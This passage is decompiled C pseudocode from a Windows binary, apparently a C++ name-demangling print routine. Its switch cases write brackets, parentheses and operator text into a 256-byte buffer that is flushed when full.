puVar15 = puVar15 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (puVar10 != puVar15);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            puVar15 = puVar11[2];\n            if (puVar11[3] != 0) {\n                puVar10 = puVar15 + puVar11[3];\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *puVar15;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    puVar15 = puVar15 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (puVar10 != puVar15);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 0x28:\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x29:\n        ppuVar21 = *(in_EAX + 0x114);\n        if ((param_2 & 0x20) == 0) {\n            if ((param_1[2] != 0) && ((param_2 & 0x40) == 0)) {\n                *(in_EAX + 0x114) = appuStack92;\n                appuStack92[3] = *(in_EAX + 0x110);\n                appuStack92[2] = NULL;\n                appuStack92[0] = ppuVar21;\n                appuStack92[1] = param_1;\n                fcn.00411160();\n                *(in_EAX + 0x114) = appuStack92[0];\n                if (appuStack92[2] != NULL) {\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    break;\n                }\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                ppuVar21 = *(in_EAX + 0x114);\n                in_EAX[0x104] = 0x20;\n            }\n            fcn.00416410(ppuVar21);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            fcn.00416410(ppuVar21);\n            if (param_1[2] == 0) {\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n            else {\n                fcn.00411160();\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 0x2a:\n        ppuVar21 = *(in_EAX + 0x114);\n        appuStack92[3] = *(in_EAX + 0x110);\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[2] = NULL;\n        appuStack92[0] = ppuVar21;\n        if ((ppuVar21 == NULL) || (2 < *ppuVar21[1] - 0x19)) {\n            appuStack92[1] = param_1;\n            fcn.00411160();\n            *(in_EAX + 0x114) = ppuVar21;\n            if (appuStack92[2] == NULL) goto code_r0x00412329;\n        }\n        else {\n            ppuVar9 = ppuVar21;\n            uVar17 = 1;\n            pppuVar22 = appuStack92;\n            do {\n                uVar6 = uVar17;\n                if (ppuVar9[2] == NULL) {\n                    if (3 < uVar17) {\n                        *(in_EAX + 0x118) = 1;\n                        goto code_r0x00412340;\n                    }\n                    uVar6 = uVar17 + 1;\n                    appuStack92[uVar17 * 4] = *ppuVar9;\n                    appuStack92[uVar17 * 4 + 1] = ppuVar9[1];\n                    appuStack92[uVar17 * 4 + 2] = ppuVar9[2];\n                    appuStack92[uVar17 * 4 + 3] = ppuVar9[3];\n                    appuStack92[uVar17 * 4] = pppuVar22;\n                    pppuVar22 = appuStack92 + uVar17 * 4;\n                    *(in_EAX + 0x114) = pppuVar22;\n                    ppuVar9[2] = 0x1;\n                }\n                ppuVar9 = *ppuVar9;\n            } while ((ppuVar9 != NULL) && (uVar17 = uVar6,  *ppuVar9[1] - 0x19 < 3));\n            appuStack92[1] = param_1;\n            fcn.00411160();\n            *(in_EAX + 0x114) = ppuVar21;\n            if (appuStack92[2] == NULL) {\n                if (uVar6 != 1) {\n                    pppuVar22 = appuStack92 + uVar6 * 4;\n                    do {\n                        pppuVar22 = pppuVar22 + -4;\n                        fcn.00415af0();\n                    } while (appuStack92 + 4 != pppuVar22);\n                }\ncode_r0x00412329:\n                fcn.00416b00(*(in_EAX + 0x114));\n            }\n        }\ncode_r0x00412340:\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x2b:\n    case 0x2d:\n        appuStack92[0] = *(in_EAX + 0x114);\n        appuStack92[2] = NULL;\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[3] = *(in_EAX + 0x110);\n        appuStack92[1] = param_1;\n        fcn.00411160();\n        if (appuStack92[2] == NULL) {\n            fcn.00415af0();\n        }\n        uVar17 = param_1[1] - 1;\n        *(in_EAX + 0x114) = appuStack92[0];\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x2c:\n        if (*(param_1 + 0xe) != 0) {\n            pcVar16 = \"_Sat \";\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                cVar12 = *pcVar16;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                iVar20 = iVar4;\n            } while (pcVar16 != \"\");\n        }\n        if (*(param_1[2] + 8) == 0x504ae0) {\n            iVar20 = *(in_EAX + 0x100);\n        }\n        else {\n            fcn.00411160();\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar4 = *(in_EAX + 0x100);\n            iVar20 = iVar4 + 1;\n            *(in_EAX + 0x100) = iVar20;\n            in_EAX[iVar4] = 0x20;\n            in_EAX[0x104] = 0x20;\n        }\n        if (*(param_1 + 3) == 0) {\n            puVar15 = 0x503ce2;\n            uVar26 = 0x5f;\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x503ce7) break;\n                uVar26 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar20 = iVar4;\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            puVar15 = 0x503ce9;\n            uVar26 = 0x5f;\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x503cee) break;\n                uVar26 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar20 = iVar4;\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x2e:\n    case 0x2f:\n        if (param_1[2] != 0) {\n            fcn.00411160();\n        }\n        if (param_1[3] == 0) {\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            uVar17 = *(in_EAX + 0x100);\n            if (0xfd < uVar17) {\n                in_EAX[uVar17] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                uVar17 = 0;\n                *(in_EAX + 0x100) = 0;\n            }\n            puVar15 = 0x503cef;\n            uVar26 = 0x2c;\n            while( true ) {\n                if (uVar17 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    uVar6 = 1;\n                    uVar17 = 0;\n                }\n                else {\n                    uVar6 = uVar17 + 1;\n                }\n                puVar15 = puVar15 + 1;\n                *(in_EAX + 0x100) = uVar6;\n                in_EAX[uVar17] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x503cf1) break;\n                uVar26 = *puVar15;\n                uVar17 = uVar6;\n            }\n            iVar20 = *(in_EAX + 0x128);\n            fcn.00411160();\n            uVar17 = param_1[1] - 1;\n            if (iVar20 == *(in_EAX + 0x128)) {\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                if (*(in_EAX + 0x100) == uVar6) {\n                    *(in_EAX + 0x100) = uVar6 - 2;\n                }\n            }\n            else {\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 0x30:\n        if (param_1[2] != 0) {\n            fcn.00411160();\n        }\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7b;\n        in_EAX[0x104] = 0x7b;\n        fcn.00411160();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7d;\n        in_EAX[0x104] = 0x7d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x31:\n        uVar17 = param_1[2];\n        puVar15 = 0x503cf3;\n        uVar26 = 0x6f;\n        iVar20 = *(uVar17 + 8);\n        iVar4 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar4 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar8 = 1;\n                iVar4 = 0;\n            }\n            else {\n                iVar8 = iVar4 + 1;\n            }\n            *(in_EAX + 0x100) = iVar8;\n            in_EAX[iVar4] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503cfa) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar4 = iVar8;\n        }\n        pcVar16 = *(uVar17 + 4);\n        if (*pcVar16 + 0x9fU < 0x1a) {\n            if (iVar8 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar4 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar4 + 1;\n            in_EAX[iVar4] = 0x20;\n            in_EAX[0x104] = 0x20;\n            pcVar16 = *(uVar17 + 4);\n        }\n        if (pcVar16[iVar20 + -1] == ' ') {\n            iVar20 = iVar20 + -1;\n        }\n        if (iVar20 == 0) {\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            pcVar23 = pcVar16 + iVar20;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                cVar12 = *pcVar16;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                iVar20 = iVar4;\n            } while (pcVar23 != pcVar16);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x32:\n        puVar15 = 0x503cfc;\n        uVar26 = 0x6f;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503d04) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    default:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        break;\n    case 0x34:\n        puVar15 = 0x503cfc;\n        uVar26 = 0x6f;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503d04) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        if (*(in_EAX + 0x148) != NULL) {\n            appuStack92[0] = *(in_EAX + 0x110);\n            *(in_EAX + 0x110) = appuStack92;\n            appuStack92[1] = *(in_EAX + 0x148);\n        }\n        if (*param_1[2] == 4) {\n            fcn.00411160();\n            if (*(in_EAX + 0x148) != 0) {\n                *(in_EAX + 0x110) = appuStack92[0];\n            }\n            if (in_EAX[0x104] == '<') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3c;\n            in_EAX[0x104] = 0x3c;\n            fcn.00411160();\n            if (in_EAX[0x104] == '>') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3e;\n            in_EAX[0x104] = 0x3e;\n        }\n        else {\n            fcn.00411160();\n            if (*(in_EAX + 0x148) != 0) {\n                *(in_EAX + 0x110) = appuStack92[0];\n            }\n        }\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x35:\n        fcn.00416da0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x36:\n        piVar5 = param_1[3];\n        iVar20 = *param_1[2];\n        if (iVar20 == 0x31) {\n            puVar19 = *param_1[2][2];\n            iVar20 = sub.msvcrt.dll_strcmp(puVar19, 0x503d05);\n            ppuStack128 = piVar5;\n            if ((iVar20 == 0) && (*piVar5 == 3)) {\n                if ((*piVar5[2] == 1) && (ppuStack128 = piVar5[2],  *piVar5[3] != 0x29)) {\n                    ppuStack128 = piVar5;\n                }\n            }\n            else if (*piVar5 == 0x38) {\n                fcn.00416e40();\n                fcn.00416da0();\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            iVar20 = sub.msvcrt.dll_strcmp(puVar19, 0x503d08);\n            bVar27 = false;\n            bVar28 = iVar20 == 0;\n            if (bVar28) {\n                for (piVar5 = fcn.0040e7c0(); ((piVar5 != NULL && (*piVar5 == 0x2f)) && (piVar5[2] != 0));\n                    piVar5 = piVar5[3]) {\n                    iVar20 = iVar20 + 1;\n                }\n                pppuVar22 = appuStack92;\n                sub.msvcrt.dll_sprintf(pppuVar22, 0x503b67, iVar20);\n                uVar17 = 0xffffffff;\n                pppuVar13 = pppuVar22;\n                do {\n                    if (uVar17 == 0) break;\n                    uVar17 = uVar17 - 1;\n                    cVar12 = *pppuVar13;\n                    pppuVar13 = pppuVar13 + 1;\n                } while (cVar12 != '\\0');\n                pppuVar13 = pppuVar22 + (~uVar17 - 1);\n                if (~uVar17 - 1 != 0) {\n                    do {\n                        cVar12 = *pppuVar22;\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        pppuVar22 = pppuVar22 + 1;\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = cVar12;\n                        in_EAX[0x104] = cVar12;\n                    } while (pppuVar13 != pppuVar22);\n                }\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            iVar20 = 3;\n            puVar18 = puVar19;\n            puVar24 = 0x503773;\n            do {\n                if (iVar20 == 0) break;\n                iVar20 = iVar20 + -1;\n                bVar27 = *puVar18 < *puVar24;\n                bVar28 = *puVar18 == *puVar24;\n                puVar18 = puVar18 + 1;\n                puVar24 = puVar24 + 1;\n            } while (bVar28);\n            uVar26 = 0;\n            uVar29 = (!bVar27 && !bVar28) == bVar27;\n            if (uVar29) {\n                iVar20 = 0;\n                do {\n                    if ((*ppuStack128 != 0x2f) || (ppuStack128[2] == NULL)) break;\n                    if (*ppuStack128[2] == 0x4a) {\n                        piVar5 = fcn.0040e7c0();\n                        iVar4 = 0;\n                        for (; ((piVar5 != NULL && (*piVar5 == 0x2f)) && (piVar5[2] != 0)); piVar5 = piVar5[3]) {\n                            iVar4 = iVar4 + 1;\n                        }\n                        iVar20 = iVar20 + iVar4;\n                    }\n                    else {\n                        iVar20 = iVar20 + 1;\n                    }\n                    ppuStack128 = ppuStack128[3];\n                } while (ppuStack128 != NULL);\n                pppuVar22 = appuStack92;\n                sub.msvcrt.dll_sprintf(pppuVar22, 0x503b67, iVar20);\n                uVar17 = 0xffffffff;\n                pppuVar13 = pppuVar22;\n                do {\n                    if (uVar17 == 0) break;\n                    uVar17 = uVar17 - 1;\n                    cVar12 = *pppuVar13;\n                    pppuVar13 = pppuVar13 + 1;\n                } while (cVar12 != '\\0');\n                if (~uVar17 - 1 != 0) {\n                    pppuVar13 = pppuVar22 + (~uVar17 - 1);\n                    iVar20 = *(in_EAX + 0x100);\n                    do {\n                        cVar12 = *pppuVar22;\n                        if (iVar20 == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            iVar20 = 0;\n                        }\n                        pppuVar22 = pppuVar22 + 1;\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = cVar12;\n                        in_EAX[0x104] = cVar12;\n                        iVar20 = iVar20 + 1;\n                    } while (pppuVar13 != pppuVar22);\n                }\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            fcn.00416da0();\n            iVar20 = 3;\n            puVar18 = puVar19;\n            puVar24 = 0x503d0b;\n            do {\n                if (iVar20 == 0) break;\n                iVar20 = iVar20 + -1;\n                uVar26 = *puVar18 < *puVar24;\n                uVar29 = *puVar18 == *puVar24;\n                puVar18 = puVar18 + 1;\n                puVar24 = puVar24 + 1;\n            } while (uVar29);\n            bVar27 = false;\n            bVar28 = (!uVar26 && !uVar29) == uVar26;\n            if (bVar28) {\n                fcn.00411160();\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            iVar20 = 3;\n            puVar18 = 0x503770;\n            do {\n                if (iVar20 == 0) break;\n                iVar20 = iVar20 + -1;\n                bVar27 = *puVar19 < *puVar18;\n                bVar28 = *puVar19 == *puVar18;\n                puVar19 = puVar19 + 1;\n                puVar18 = puVar18 + 1;\n            } while (bVar28);\n            if ((!bVar27 && !bVar28) == bVar27) {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x28;\n                in_EAX[0x104] = 0x28;\n                fcn.00411160();\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x29;\n                in_EAX[0x104] = 0x29;\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n        }\n        else if (iVar20 == 0x33) {\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x28;\n            in_EAX[0x104] = 0x28;\n            fcn.00411160();\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x29;\n            in_EAX[0x104] = 0x29;\n        }\n        else {\n            fcn.00416da0();\n        }\n        fcn.00416e40();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x37:\n        if (*param_1[3] == 0x38) {\n            if (((**(param_1[2] + 8))[1] == 'c') &&\n               ((cVar12 = ***(param_1[2] + 8),  cVar12 + 0x9dU < 2 || (cVar12 + 0x8eU < 2)))) {\n                fcn.00416da0();\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                puVar15 = 0x503d0e;\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x3c;\n                in_EAX[0x104] = 0x3c;\n                fcn.00411160();\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *puVar15;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar20 = 0;\n                    }\n                    puVar15 = puVar15 + 1;\n                    *(in_EAX + 0x100) = iVar20 + 1;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar20 + 1;\n                } while (puVar15 != 0x503d10);\n                fcn.00411160();\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x29;\n                in_EAX[0x104] = 0x29;\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n            else {\n                iVar20 = fcn.00416f30(param_1 + 3);\n                if (iVar20 == 0) {\n                    piVar5 = param_1[2];\n                    if (((*piVar5 == 0x31) && (*(piVar5[2] + 8) == 1)) && (**(piVar5[2] + 4) == '>')) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x28;\n                        in_EAX[0x104] = 0x28;\n                        piVar5 = param_1[2];\n                    }\n                    iVar20 = sub.msvcrt.dll_strcmp(*piVar5[2], 0x503776);\n                    if ((iVar20 == 0) && (**(param_1[3] + 8) == 3)) {\n                        if (*(*(param_1[3] + 8))[3] != 0x29) {\n                            *(in_EAX + 0x118) = 1;\n                        }\n                        fcn.00416e40();\n                    }\n                    else {\n                        fcn.00416e40();\n                    }\n                    uVar2 = **(param_1[2] + 8);\n                    iVar20 = sub.msvcrt.dll_strcmp(uVar2, 0x503d11);\n                    if (iVar20 == 0) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x5b;\n                        in_EAX[0x104] = 0x5b;\n                        fcn.00411160();\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x5d;\n                        in_EAX[0x104] = 0x5d;\n                    }\n                    else {\n                        iVar20 = sub.msvcrt.dll_strcmp(uVar2, 0x503776);\n                        if (iVar20 != 0) {\n                            fcn.00416da0();\n                        }\n                        fcn.00416e40();\n                    }\n                    if (((*param_1[2] == 0x31) && (iVar20 = param_1[2][2],  *(iVar20 + 8) == 1)) &&\n                       (**(iVar20 + 4) == '>')) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x29;\n                        in_EAX[0x104] = 0x29;\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                    else {\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                }\n                else {\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                }\n            }\n        }\n        else {\n            *(in_EAX + 0x118) = 1;\n            uVar17 = param_1[1] - 1;\n        }\n        break;\n    case 0x38:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        break;\n    case 0x39:\n        if ((*param_1[3] == 0x3a) && 